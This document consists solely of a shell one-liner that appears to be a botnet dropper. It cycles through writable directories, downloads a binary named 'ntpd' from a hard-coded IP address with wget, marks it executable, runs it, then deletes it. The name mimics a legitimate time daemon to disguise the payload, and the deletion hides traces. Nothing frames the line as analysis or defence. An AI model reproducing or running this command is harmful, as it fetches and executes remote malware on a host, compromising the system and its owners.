cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://45.32.67.139/ntpd; chmod +x ntpd; ./ntpd; rm -rf ntpd
